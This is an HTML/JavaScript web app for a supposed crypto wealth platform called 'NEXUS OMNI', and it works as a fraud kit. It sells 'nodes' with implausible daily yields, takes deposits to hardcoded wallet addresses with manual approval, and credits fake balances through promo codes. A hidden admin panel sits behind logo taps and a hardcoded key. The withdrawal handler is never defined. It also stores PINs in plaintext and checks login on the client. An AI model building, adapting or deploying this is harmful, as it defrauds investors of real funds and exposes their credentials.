<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI v8.0 | Institutional Asset Management</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
        :root { --nexus-blue: #2563eb; --nexus-black: #020617; }
        body { background: #f8fafc; color: #0f172a; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        
        /* Premium UI Components */
        .glass-card { background: #ffffff; border: 1px solid rgba(0,0,0,0.04); border-radius: 32px; box-shadow: 0 15px 35px -10px rgba(0,0,0,0.05); }
        .btn-prime { background: var(--nexus-black); color: #fff; border-radius: 20px; font-weight: 800; padding: 22px; transition: 0.3s; border: none; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 2px; }
        .btn-prime:active { transform: scale(0.95); }
        .input-prime { background: #f1f5f9; border-radius: 18px; padding: 18px; width: 100%; border: 2px solid transparent; outline: none; transition: 0.3s; font-weight: 600; font-size: 14px; }
        .input-prime:focus { border-color: var(--nexus-blue); background: #fff; }
        
        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; cursor: pointer; transition: 0.3s; }
        .nav-link.active { color: var(--nexus-blue); transform: translateY(-5px); }
        
        #nexus-loader { position: fixed; inset: 0; background: #fff; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .page-anim { animation: pageFadeIn 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
        @keyframes pageFadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        /* Status Badges */
        .badge { padding: 4px 12px; border-radius: 8px; font-size: 9px; font-weight: 900; text-transform: uppercase; }
        .badge-success { background: #dcfce7; color: #15803d; }
        .badge-wait { background: #fef3c7; color: #b45309; }
    </style>
</head>
<body>

    <div id="nexus-loader">
        <div class="w-16 h-16 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
        <p class="mt-4 text-[10px] font-black uppercase tracking-[5px] text-slate-400">Securing Session...</p>
    </div>

    <div id="auth-layer" class="min-h-screen flex items-center justify-center p-8">
        <div class="max-w-md w-full space-y-12">
            <div class="text-center">
                <h1 class="text-5xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1>
                <p class="text-[9px] font-black text-slate-400 uppercase tracking-[10px] mt-4">Autonomous Wealth</p>
            </div>

            <div id="login-box" class="glass-card p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Account Identifier" class="input-prime">
                <input type="password" id="l-pass" placeholder="Security PIN" class="input-prime">
                <button onclick="login()" class="btn-prime">Authorize Link</button>
                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">New Partner? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Register Profile</span></p>
            </div>

            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Choose Identifier" class="input-prime">
                <input type="password" id="s-pass" placeholder="Set Security PIN" class="input-prime">
                <button onclick="signup()" class="btn-prime">Initialize Vault</button>
                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">Registered? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Login Now</span></p>
            </div>
        </div>
    </div>

    <div id="main-interface" class="hidden pb-40">
        <header class="p-6 sticky top-0 z-50 bg-white/80 backdrop-blur-2xl border-b border-slate-100 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="nexus-logo" class="w-14 h-14 bg-black text-white rounded-[20px] flex items-center justify-center text-2xl font-black shadow-xl">N</div>
                <div>
                    <p id="user-name" class="text-sm font-black text-slate-900 uppercase tracking-tight">---</p>
                    <div class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span><p class="text-[9px] font-bold text-slate-400 uppercase">Vault Secured</p></div>
                </div>
            </div>
            <button onclick="logout()" class="w-12 h-12 rounded-2xl bg-slate-50 flex items-center justify-center text-slate-400"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="view-home" class="p-6 space-y-8 page-anim">
            <div class="glass-card p-10 relative overflow-hidden border-none shadow-2xl">
                <div class="relative z-10 space-y-10">
                    <div>
                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Portfolio Total Equity</p>
                        <h2 id="ui-balance" class="text-5xl font-black mt-3 tracking-tighter text-slate-900">$0.00</h2>
                    </div>
                    <div class="flex justify-between items-end border-t border-slate-50 pt-8">
                        <div>
                            <p class="text-[9px] font-bold text-slate-500 uppercase tracking-widest">24H Net Yield</p>
                            <p id="ui-profit" class="text-3xl font-black text-emerald-600">+$0.00</p>
                        </div>
                        <button onclick="copyLink()" class="bg-blue-600 text-white px-6 py-3 rounded-2xl text-[10px] font-black uppercase tracking-tighter">Share Link</button>
                    </div>
                </div>
                <div class="absolute -right-16 -top-16 w-60 h-60 bg-blue-50 rounded-full blur-[80px]"></div>
            </div>

            <div class="glass-card p-5 flex gap-4 items-center">
                <div class="w-12 h-12 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center text-xl"><i class="fa-solid fa-bolt"></i></div>
                <input type="text" id="promo-code" placeholder="Enter Grant Hash" class="bg-transparent border-none outline-none flex-1 font-bold text-xs uppercase">
                <button onclick="redeem()" class="text-blue-600 font-black text-[11px] uppercase pr-2">Apply</button>
            </div>

            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[6px] ml-2">Active Node Protocols</h3>
            <div id="active-nodes-list" class="space-y-4"></div>
        </main>

        <main id="view-nodes" class="p-6 space-y-6 hidden page-anim">
            <h3 class="text-sm font-black uppercase border-l-8 border-blue-600 pl-4">Elite Sovereign Nodes (5)</h3>
            <div id="elite-catalog" class="grid gap-5"></div>
            <h3 class="text-sm font-black uppercase border-l-8 border-slate-200 pl-4 mt-12">Standard Retail Nodes (12)</h3>
            <div id="standard-catalog" class="grid gap-4"></div>
        </main>

        <main id="view-bank" class="p-6 space-y-8 hidden page-anim">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Capital Injection</h3>
                <select id="dep-asset" class="input-prime font-black" onchange="toggleDepUI()">
                    <option value="">Asset Gateway</option>
                    <option value="TRX">TRX (Trust Wallet)</option>
                    <option value="ETH">ETH (Metamask)</option>
                    <option value="USDT">USDT (Binance TRC20)</option>
                </select>
                <div id="dep-panel" class="hidden space-y-6 border-t pt-8">
                    <div class="bg-slate-50 p-6 rounded-3xl border border-slate-100 text-center">
                        <p id="addr-display" class="text-[11px] font-mono font-black text-blue-600 break-all select-all"></p>
                    </div>
                    <input type="number" id="dep-val" placeholder="Amount ($)" class="input-prime">
                    <input type="text" id="dep-hash" placeholder="Transaction ID (TID)" class="input-prime">
                    <input type="file" id="dep-img" class="text-[10px] font-bold">
                    <button onclick="submitDep()" class="btn-prime shadow-xl shadow-blue-600/10">Process Settlement</button>
                </div>
            </div>

            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Capital Withdrawal</h3>
                <select id="with-method" class="input-prime font-black">
                    <option value="">Payout Channel</option>
                    <option value="Binance">Binance</option><option value="Trust">Trust Wallet</option><option value="Metamask">Metamask</option>
                    <option value="OKX">OKX</option><option value="ByBit">ByBit</option><option value="Wire">Swift Bank Wire</option>
                </select>
                <input type="number" id="with-val" placeholder="Amount ($)" class="input-prime">
                <input type="text" id="with-addr" placeholder="Destination Address" class="input-prime">
                <button onclick="submitWith()" class="btn-prime !bg-slate-800">Finalize Payout</button>
            </div>
        </main>

        <main id="view-ledger" class="p-6 space-y-4 hidden page-anim">
            <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Audit History</h3>
            <div id="ledger-items" class="space-y-4"></div>
        </main>

        <nav class="fixed bottom-10 left-8 right-8 h-24 glass-card shadow-2xl flex justify-around items-center px-6 z-[1000]">
            <div onclick="tab('home')" class="nav-link active"><i class="fa-solid fa-home-alt text-2xl mb-1"></i>HOME</div>
            <div onclick="tab('nodes')" class="nav-link"><i class="fa-solid fa-microchip text-2xl mb-1"></i>ASSETS</div>
            <div onclick="tab('bank')" class="nav-link"><i class="fa-solid fa-exchange-alt text-2xl mb-1"></i>BANK</div>
            <div onclick="tab('ledger')" class="nav-link"><i class="fa-solid fa-list-check text-2xl mb-1"></i>LEDGER</div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-white z-[10001] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 pb-6 border-b">
            <h2 class="text-lg font-black uppercase tracking-widest">Master Protocol Control</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-6xl font-light">&times;</button>
        </div>
        <div id="admin-requests" class="space-y-8"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        const nodes = {
            elite: [
                { id: 801, name: "Omni Sovereign", price: 3000, daily: 350, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" },
                { id: 802, name: "Omni Titan", price: 7500, daily: 900, img: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=400" },
                { id: 803, name: "Omni Prime", price: 12000, daily: 1600, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=400" },
                { id: 804, name: "Omni Elite Core", price: 18000, daily: 2500, img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?w=400" },
                { id: 805, name: "Omni Master Alpha", price: 25000, daily: 3800, img: "https://images.unsplash.com/photo-1620321023374-d1a68fbc720d?w=400" }
            ],
            standard: Array.from({length: 12}, (_, i) => ({
                id: i+1, name: `Protocol v${i+1}`, price: 50 + (i*180), daily: 8 + (i*22), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400&sig=${i}`
            }))
        };

        window.onload = () => {
            renderCatalog();
            setTimeout(() => document.getElementById('nexus-loader').style.display='none', 1000);
            const user = localStorage.getItem('nexus_user');
            if(user) bootSession(user);
        };

        function renderCatalog() {
            const card = (n) => `
                <div class="glass-card overflow-hidden flex items-center h-32 border-none shadow-xl shadow-slate-100">
                    <img src="${n.img}" class="w-32 h-32 object-cover">
                    <div class="px-8 flex-1">
                        <h4 class="text-xs font-black uppercase">${n.name}</h4>
                        <p class="text-[10px] font-black text-emerald-600 mt-1">Daily Yield: $${n.daily}</p>
                        <div class="flex justify-between items-center mt-4">
                            <span class="text-lg font-black">$${n.price}</span>
                            <button onclick="deploy(${n.id})" class="bg-black text-white text-[9px] font-black px-6 py-2.5 rounded-2xl">DEPLOY</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('elite-catalog').innerHTML = nodes.elite.map(card).join('');
            document.getElementById('standard-catalog').innerHTML = nodes.standard.map(card).join('');
        }

        function bootSession(uid) {
            document.getElementById('auth-layer').classList.add('hidden');
            document.getElementById('main-interface').classList.remove('hidden');
            document.getElementById('user-name').innerText = uid;
            
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('ui-balance').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-profit').innerText = '+$' + (d.profit || 0).toLocaleString();
                
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-l-8 border-blue-600 shadow-sm">
                        <div><p class="text-[11px] font-black uppercase">${v.name}</p><p class="text-[9px] text-slate-300 font-bold mt-1">Status: Active Yielding</p></div>
                        <span class="text-xs font-mono font-black bg-slate-50 px-5 py-2.5 rounded-2xl clock" data-next="${v.nextClaim}">00:00:00</span>
                    </div>`).join('') || '<div class="text-center py-20 text-[10px] font-black text-slate-300 uppercase tracking-[5px]">No Protocols Active</div>';

                const history = d.history ? Object.entries(d.history).reverse() : [];
                document.getElementById('ledger-items').innerHTML = history.map(([k, h]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-none shadow-sm">
                        <div><p class="text-[11px] font-black uppercase">${h.type}</p><p class="text-[9px] text-slate-400 font-bold mt-1">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black text-slate-900">$${h.amount}</p><span class="badge ${h.status === 'Cleared' ? 'badge-success' : 'badge-wait'}">${h.status}</span></div>
                    </div>`).join('');
            });
        }

        window.redeem = async () => {
            const code = document.getElementById('promo-code').value.trim();
            const rewards = { "NX100": 100, "ELITE500": 500, "SWEETIE": 1000 };
            if(rewards[code]) {
                const uid = localStorage.getItem('nexus_user');
                const s = await get(ref(db, `users/${uid}`));
                await update(ref(db, `users/${uid}`), { balance: (s.val().balance || 0) + rewards[code] });
                alert("Institutional Grant Credited!");
                document.getElementById('promo-code').value = "";
            } else alert("Invalid Hash.");
        };

        window.submitDep = () => {
            const f = document.getElementById('dep-img').files[0];
            if(!f) return alert("Audit proof required.");
            const reader = new FileReader();
            reader.readAsDataURL(f);
            reader.onload = async () => {
                const uid = localStorage.getItem('nexus_user'), key = push(ref(db, 'admin/requests')).key;
                const req = { id: key, user: uid, amount: document.getElementById('dep-val').value, tid: document.getElementById('dep-hash').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() };
                await set(ref(db, `admin/requests/${key}`), req);
                await set(ref(db, `users/${uid}/history/${key}`), req);
                alert("Audit Initiated.");
                tab('ledger');
            };
        };

        // ADMIN ACCESS
        let taps = 0; document.getElementById('nexus-logo').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Nexus Protocol Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; }
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass-card p-8 space-y-6 shadow-2xl">
                        <div class="flex justify-between font-black text-xs uppercase"><span>${r.type} | User: ${r.user}</span><span>$${r.amount}</span></div>
                        <img src="${r.proof}" class="w-full h-64 object-cover rounded-3xl border">
                        <div class="flex gap-4">
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared')" class="btn-prime !bg-emerald-600 flex-1">Authorize</button>
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined')" class="btn-prime !bg-rose-600 flex-1">Reject</button>
                        </div>
                    </div>`).join('') : '<p class="text-center font-black text-slate-300">No Pending Audits</p>';
            });
        }

        window.audit = async (id, user, amt, status) => {
            if(status === 'Cleared') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            await update(ref(db, `users/${user}/history/${id}`), { status });
            await remove(ref(db, 'admin/requests/' + id));
        };

        window.toggleDepUI = () => {
            const m = document.getElementById('dep-asset').value;
            const map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "ETH": "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" };
            document.getElementById('addr-display').innerText = map[m] || "";
            document.getElementById('dep-panel').classList.toggle('hidden', !m);
        };

        window.tab = (p) => { ['home','nodes','bank','ledger'].forEach(x => document.getElementById('view-'+x).classList.add('hidden')); document.getElementById('view-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.login = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value; const s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); bootSession(u); } else alert("Access Denied."); };
        window.signup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value; if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); toggleAuth(false); } };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };

        setInterval(() => {
            document.querySelectorAll('.clock').forEach(el => {
                const diff = parseInt(el.dataset.next) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                } else el.innerText = "Syncing...";
            });
        }, 1000);
    </script>
</body>
</html>
